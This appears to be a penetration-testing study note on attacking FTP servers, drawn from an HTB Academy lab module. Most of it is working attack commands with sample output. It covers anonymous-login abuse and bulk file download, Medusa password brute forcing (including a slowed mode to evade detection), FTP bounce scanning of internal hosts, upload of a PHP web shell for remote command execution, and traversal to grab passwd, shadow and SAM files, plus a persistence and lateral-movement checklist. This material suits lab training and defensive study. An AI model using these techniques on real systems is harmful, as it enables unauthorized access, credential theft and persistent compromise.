# 🔓 FTP (File Transfer Protocol) Attacks

## 🎯 Overview

This document covers **exploitation techniques** against FTP services, focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. Unlike enumeration, these techniques aim to **gain unauthorized access, escalate privileges, or exploit misconfigurations**.

> **"The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. We can abuse misconfigurations or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities."**

## 🏗️ FTP Attack Methodology

### Attack Chain Overview
```
Service Discovery → Misconfiguration Analysis → Authentication Attacks → File System Exploitation → Privilege Escalation
```

### Key Attack Objectives
- **Unauthorized file access** through anonymous authentication
- **Credential compromise** via brute force attacks  
- **Network pivoting** using FTP bounce attacks
- **Remote code execution** through file upload capabilities
- **Information disclosure** via configuration analysis

---

## ⚠️ Misconfiguration Exploitation

### Anonymous Access Abuse

#### Anonymous Authentication Attack
```bash
# Test anonymous access
ftp target_ip
# Username: anonymous
# Password: anonymous (or any email address)

# HTB Academy example session:
$ ftp 192.168.2.142
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:user): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

#### Mass Data Extraction
```bash
# Automated download of accessible files
wget -m --no-passive ftp://anonymous:anonymous@target_ip

# Results in organized directory structure
tree target_ip/
└── target_ip
    ├── sensitive_documents/
    │   ├── passwords.txt
    │   ├── database_config.ini
    │   └── employee_list.xlsx
    └── backup_files/
        └── system_backup.tar.gz
```

---

## 🔐 Authentication Attacks

### Brute Force with Medusa

#### Basic Medusa Usage
```bash
# Single user brute force
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h target_ip -M ftp

# HTB Academy example:
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

# Expected output:
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

#### Advanced Medusa Attacks
```bash
# Multi-user brute force
medusa -U userlist.txt -P passwords.txt -h target_ip -M ftp

# Targeted attack with common passwords
medusa -u admin -p admin,password,123456,ftp,root -h target_ip -M ftp

# Slow brute force to avoid detection
medusa -u admin -P passwords.txt -h target_ip -M ftp -t 1 -s 5
```

---

## 🌐 FTP Bounce Attack Exploitation

### HTB Academy FTP Bounce Implementation
```bash
# Nmap FTP bounce scan
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

# Expected output:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http
```

### Manual FTP Bounce Attack
```bash
# Connect to FTP server
ftp vulnerable_ftp_server

# Use PORT command to target internal host
ftp> port 192,168,1,100,0,22  # Target 192.168.1.100:22
200 PORT command successful.

# Trigger connection with LIST
ftp> list
150 Here comes the directory listing.
# Connection attempt made to target
```

---

## 🗃️ File System Exploitation

### Web Shell Upload Attack
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to web-accessible directory
ftp> cd /var/www/html
ftp> put shell.php
ftp> quit

# Execute commands
curl "http://target_ip/shell.php?cmd=whoami"
```

### Directory Traversal Attacks
```bash
# Test directory traversal
ftp> cd ../../../etc
ftp> get passwd
ftp> get shadow

# Windows traversal
ftp> cd ..\..\..\Windows\System32
ftp> get SAM
```

---

## 📋 FTP Attack Checklist

### Authentication Attacks
- [ ] **Anonymous authentication** - Default access testing
- [ ] **Brute force with Medusa** - Automated password attacks
- [ ] **Password spraying** - Single password, multiple users
- [ ] **Default credentials** - Common username/password combinations

### Exploitation Attacks
- [ ] **FTP bounce scanning** - Internal network reconnaissance
- [ ] **File upload testing** - Web shell and malware upload
- [ ] **Directory traversal** - File system exploration
- [ ] **Configuration exploitation** - Modify server settings

### Post-Exploitation
- [ ] **Sensitive file extraction** - Configuration, credential files
- [ ] **Persistence mechanisms** - SSH keys, cron jobs, web shells
- [ ] **Privilege escalation** - SUID binaries, configuration abuse
- [ ] **Lateral movement** - Use FTP server as pivot point

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: Anonymous Access Exploitation
```bash
# Target has anonymous FTP with write access to web directory
ftp target_ip
# Username: anonymous, Password: anonymous

# Upload web shell to web-accessible directory
ftp> cd htdocs
ftp> put shell.php
ftp> quit

# Achieve remote code execution
curl "http://target_ip/shell.php?cmd=whoami"
```

### Scenario 2: Brute Force with Medusa
```bash
# Discovered username through enumeration: fiona
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h target_ip -M ftp

# Result: fiona:family
# Access FTP and extract sensitive files
```

### Scenario 3: FTP Bounce Attack
```bash
# Use FTP server to scan internal network
nmap -Pn -v -n -p80 -b anonymous:password@ftp_server internal_target

# Discover internal services through FTP proxy
```

---

## 💡 Key Attack Insights

### Attack Effectiveness Factors
1. **Anonymous access** - Immediate exploitation opportunity
2. **Write permissions** - Enable file upload attacks
3. **Web directory access** - Direct path to code execution
4. **Weak credentials** - Entry point for authorized access
5. **Internal network position** - Pivot for lateral movement

### Common Attack Patterns
1. **Reconnaissance** → Anonymous testing → File extraction
2. **Brute force** → Credential discovery → Privilege abuse  
3. **Bounce attack** → Internal scanning → Lateral movement
4. **File upload** → Web shell → Remote code execution
5. **Configuration abuse** → Persistence → Privilege escalation

---

*This document provides comprehensive FTP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 